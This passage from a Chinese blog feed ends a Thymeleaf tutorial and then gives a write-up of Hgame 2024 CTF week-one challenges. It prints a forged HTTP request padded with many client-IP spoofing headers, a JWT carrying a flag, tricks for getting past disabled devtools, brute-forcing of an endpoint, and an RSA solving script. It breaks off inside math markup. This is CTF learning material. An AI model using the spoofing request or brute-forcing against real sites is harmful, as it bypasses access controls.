alt="image-20240719152522895"></p><ul><li>遍历</li></ul><p>首先在Controller层中写个数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">model.addAttribute(<span class="string">&quot;users&quot;</span>, Arrays.asList(<span class="string">&quot;happySu&quot;</span>, <span class="string">&quot;is&quot;</span>, <span class="string">&quot;your dad&quot;</span>));</span><br></pre></td></tr></table></figure><p>然后再html中修改一下 提供两种赋值方法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>111<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">th:utext</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方法一： $&#123;&#125;都是在取变量的值  这是循环遍历users变量 赋值给user  先遍历出来  然后后面text取值 取刚刚遍历出来的变量user的值进行输出--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">th:each</span>=<span class="string">&quot;user:$&#123;users&#125;&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;user&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--方法二： 行内输出  两个中括号包裹起来就行--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span> <span class="attr">th:each</span>=<span class="string">&quot;user:$&#123;users&#125;&quot;</span>&gt;</span>[[ $&#123;user&#125; ]]<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果</p><p><img src="https://img-blog.csdnimg.cn/img_convert/54b66d0fbcc20a97926c491178331551.png" alt="image-20240719153357118"></p><h3 id="0x03-springmvc配置原理">0x03 SpringMVC配置原理</h3><p>@Configuration注解：表示是一个配置类</p><p>总结：在Springboot中，有非常多的xxxConfiguration帮助我们进行扩展配置 看到后要注意嗷</p><hr><p>学完基础的一点内容，后面展开一个项目的整体开发，期待吧~</p>]]></content>
      
      
      <categories>
          
          <category> ctf-web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf-web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hgame2024-WriteUp</title>
      <link href="/2024/02/06/2024-01-29-Hgame%20(copy)/"/>
      <url>/2024/02/06/2024-01-29-Hgame%20(copy)/</url>
      
        <content type="html"><![CDATA[<h1 id="hgame-2024">Hgame 2024</h1><h2 id="第一周">第一周</h2><p>解题情况：</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205194242011.png" alt="image-20240205194242011"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205194436160.png" alt="image-20240205194436160"></p><h3 id="web">Web</h3><h4 id="ezhttp">ezHTTP</h4><h5 id="考点：http请求头-jwt">考点：HTTP请求头 JWT</h5><h5 id="解题：">解题：</h5><p>首先是基础的HTTP请求头伪造</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 47.100.137.175:30761</span><br><span class="line">#1</span><br><span class="line">User-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line">#2</span><br><span class="line">Referer: vidar.club</span><br><span class="line">#3</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240130175814751.png" alt="image-20240130175814751"></p><p>然后得到最后的界面是flag已经给我了</p><p>我懵了一下 找了下没有</p><p>然后对比一下和上面的界面 发现多了一个Bearer</p><p>这里使用jwt解密</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240130175954184.png" alt="image-20240130175954184"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc</span><br></pre></td></tr></table></figure><h4 id="bypass-it">Bypass it</h4><h5 id="考点：javascrit禁用">考点：javascrit禁用</h5><h5 id="解题：">解题：</h5><p>无法登录</p><p>注册有弹窗拦截</p><p>根据题目提示到js enabled</p><p>所以先禁用注册 然后解禁</p><p>进行正常登录 直接拿到flag</p><p><code>hgame&#123;2ea3880a2c9973b41606b1cfe1dce682aebdf972&#125;</code></p><h4 id="2048">2048</h4><h5 id="考点：前段小游戏-f12">考点：前段小游戏 F12</h5><h5 id="解题：">解题：</h5><p>前端小游戏的思路就是去查看网页源码 看F12的代码</p><p>界面本身F12被禁用了 查看不了</p><p>解决方法就是在页面没有完全加载之前狂按F12卡进去</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205010643423.png" alt="image-20240205010643423"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">game-won<span class="string">&quot;:n(443),t=x?s0(n(439),&quot;</span>V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=<span class="title class_">QcTq6JkWK4</span>t3<span class="string">&quot;):n(453);this[n(438)][n(437)].add(e),this[n(438)][n(435)](&quot;</span>p<span class="string">&quot;)[-1257*-5+9*1094+-5377*3].textContent=t&#125;</span></span><br></pre></td></tr></table></figure><p>找到敏感信息<code>game-won</code> 游戏获胜的结果 对后面的内容丢进cyberchef看看</p><p>非常像base64的换表</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205012441443.png" alt="image-20240205012441443"></p><p>找到密文</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240205012458634.png" alt="image-20240205012458634"></p><p><code>flag&#123;b99b820f-934d-44d4-93df-41361df7df2d&#125;</code></p><h4 id="选课">选课</h4><h5 id="考点：查接口-格式-爆破">考点：查接口 格式 爆破</h5><h5 id="解题：">解题：</h5><p>先对提交的时候抓包</p><p>在前端看到格式</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240202000632158.png" alt="image-20240202000632158"></p><p>多次暴力攻击 修改成功</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240202000529039.png" alt="image-20240202000529039"></p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240202000552904.png" alt="image-20240202000552904"></p><p><code>hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125;</code></p><h3 id="reverse">Reverse</h3><h4 id="ezida">ezIDA</h4><h5 id="考点：ida使用">考点：IDA使用</h5><h5 id="解题：">解题：</h5><p>拖进IDAx64 在IDA View-A窗口 按空格快捷键转化 查到flag</p><p><img src="https://gitee.com/happy_superman/happy/raw/master/image-20240131085358707.png" alt="image-20240131085358707"></p><h3 id="crypto">Crypto</h3><h4 id="ezrsa">ezRSA</h4><h5 id="考点：rsa-取模">考点：RSA 取模</h5><h5 id="解题：">解题：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from secret import flag</span></span><br><span class="line"><span class="comment"># m=bytes_to_long(flag)</span></span><br><span class="line"><span class="comment"># p=getPrime(1024)</span></span><br><span class="line"><span class="comment"># q=getPrime(1024)</span></span><br><span class="line"><span class="comment"># n=p*q</span></span><br><span class="line"><span class="comment"># phi=(p-1)*(q-1)</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="comment"># c=pow(m,e,n)</span></span><br><span class="line"><span class="comment"># leak1=pow(p,q,n)</span></span><br><span class="line"><span class="comment"># leak2=pow(q,p,n)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(f&#x27;leak1=&#123;leak1&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;leak2=&#123;leak2&#125;&#x27;)</span></span><br><span class="line"><span class="comment"># print(f&#x27;c=&#123;c&#125;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line">leak1=<span class="number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span></span><br><span class="line">leak2=<span class="number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span></span><br><span class="line">c=<span class="number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = leak2 * leak1</span><br><span class="line">phi = (leak1 - <span class="number">1</span>) * (leak2 - <span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>根据leak的生成方式 直接作为p和q解即可</p><h4 id="strangepicture">StrangePicture</h4><h5 id="考点：异或-图片加密">考点：异或 图片加密</h5><h5 id="解题：">解题：</h5><p>首先本地想测试一下 但是没有<code>PIL</code> 模块</p><p>直接下载发现找不到 是因为python3的缘故</p><p>目前PIL在pip下载的时候改名了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure><p>这样下载 使用PIL即可</p><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;hgame&#123;fake_flag&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成指定宽度和高度的随机颜色图像 大概率是个标准化的东西 不重要 完全没有</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_image</span>(<span class="params">width, height</span>):</span><br><span class="line">    image = Image.new(<span class="string">&quot;RGB&quot;</span>, (width, height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    pixels = image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):  <span class="comment">#遍历像素的每一列</span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):  <span class="comment">#遍历像素的每一行</span></span><br><span class="line">            red = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            green = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            blue = random.randint(<span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">            <span class="comment">#给当前像素点赋颜色</span></span><br><span class="line">            pixels[x, y] = (red, green, blue)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment">#在给定图像上随机位置绘制一个文本标志 单纯的绘制 对于解密没帮助</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw_text</span>(<span class="params">image, width, height, token</span>):</span><br><span class="line">    font_size = random.randint(<span class="number">16</span>, <span class="number">40</span>)  <span class="comment">#成一个介于 16 和 40 之间的随机字体大小。</span></span><br><span class="line">    font = ImageFont.truetype(<span class="string">&quot;arial.ttf&quot;</span>, font_size)  <span class="comment">#加载字体文件 &quot;arial.ttf&quot; 并创建一个指定大小的字体对象。</span></span><br><span class="line">    text_color = (random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>), random.randint(<span class="number">0</span>, <span class="number">255</span>))  <span class="comment">#生成一个随机的 RGB 值，作为文本的颜色。</span></span><br><span class="line">    <span class="comment">#在图像上的 (x, y) 坐标处绘制给定的文本标志 token，使用指定的字体、颜色进行填充。 同时x和y的操作 保证随机坐标一定在图像内部</span></span><br><span class="line">    x = random.randint(<span class="number">0</span>, width - font_size * <span class="built_in">len</span>(token))</span><br><span class="line">    y = random.randint(<span class="number">0</span>, height - font_size)</span><br><span class="line">    draw = ImageDraw.Draw(image)</span><br><span class="line">    draw.text((x, y), token, font=font, fill=text_color)</span><br><span class="line">    <span class="keyword">return</span> image</span><br><span class="line"></span><br><span class="line"><span class="comment">#对图像进行异或 感觉可逆</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_images</span>(<span class="params">image1, image2</span>):</span><br><span class="line">    <span class="keyword">if</span> image1.size != image2.size:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Images must have the same dimensions.&quot;</span>)</span><br><span class="line">    xor_image = Image.new(<span class="string">&quot;RGB&quot;</span>, image1.size)  <span class="comment">#创建一个新图像 存储异或后的结果</span></span><br><span class="line">    pixels1 = image1.load()  <span class="comment">#载入像素数据</span></span><br><span class="line">    pixels2 = image2.load()</span><br><span class="line">    xor_pixels = xor_image.load()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">0</span>]):  <span class="comment">#遍历图像的每一列 </span></span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(image1.size[<span class="number">1</span>]):  <span class="comment">#遍历每一行</span></span><br><span class="line">            r1, g1, b1 = pixels1[x, y]   <span class="comment">#颜色值RGB</span></span><br><span class="line">            r2, g2, b2 = pixels2[x, y]</span><br><span class="line">            xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2) <span class="comment">#三值异或 完成像素点的异或</span></span><br><span class="line">    <span class="keyword">return</span> xor_image</span><br><span class="line"></span><br><span class="line"><span class="comment">#生成一定数量的指定长度的唯一随机字符串  恢复时间的 看看有没有什么顺序 =&gt; 无</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_unique_strings</span>(<span class="params">n, length</span>):</span><br><span class="line">    unique_strings = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(unique_strings) &lt; n:</span><br><span class="line">        random_string = secrets.token_hex(length // <span class="number">2</span>)</span><br><span class="line">        unique_strings.add(random_string)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>(unique_strings)</span><br><span class="line"></span><br><span class="line"><span class="comment">#给图像命名 图片个数就是flag的字符数</span></span><br><span class="line">random_strings = generate_unique_strings(<span class="built_in">len</span>(flag), <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line">key_image = generate_random_image(<span class="number">120</span>, <span class="number">80</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#以一定的时间顺序保存图片</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">image, name</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    image.save(<span class="string">&quot;.\\png_out\\&#123;&#125;.png&quot;</span>.<span class="built_in">format</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    current_image = draw_text(current_image, <span class="number">120</span>, <span class="number">80</span>, flag[i]) <span class="comment">#将flag的每个字符逐个绘制到current_image中</span></span><br><span class="line">    <span class="comment">#为了保证字符的顺序 设置了时间线程 与keyimage异或 函数是random_time 参数args分别是图片和名称</span></span><br><span class="line">    threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意读取当前目录的文件时 一定要看控制台的目录！</p><ul><li>时间函数测试</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">random_time</span>(<span class="params">h</span>):</span><br><span class="line">    time.sleep(random.random())</span><br><span class="line">    <span class="built_in">print</span>(h)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    threading.Thread(target=random_time, args=(i,)).start()</span><br></pre></td></tr></table></figure><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">6</span><br><span class="line">9</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">5</span><br><span class="line">8</span><br><span class="line">0</span><br><span class="line">7</span><br><span class="line">证明生成的顺序是不一定的</span><br></pre></td></tr></table></figure><hr><p>分析一下题目的加密过程：</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>1</mn></msub><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>2</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>3</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>3</mn></msub><mspace linebreak="newline"></mspace><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>20</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>20</mn></msub><mspace linebreak="newline"></mspace><msub><mi>C</mi><mn>21</mn></msub><mo>⨁</mo><mi>K</mi><mo>=</mo><msub><mi>O</mi><mn>21</mn></msub></mrow><annotation encoding="application/x-tex">C_1 \bigoplus K = O_1\\C_2 \bigoplus K = O_2\\C_3 \bigoplus K = O_3\\...\\C_{20} \bigoplus K = O_{20}\\C_{21} \bigoplus K = O_{21}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.6000100000000002em;vertical-align:-0.55001em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-symbol large-op" style="position:relative;top:-0.000004999999999977245em;">⨁</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" 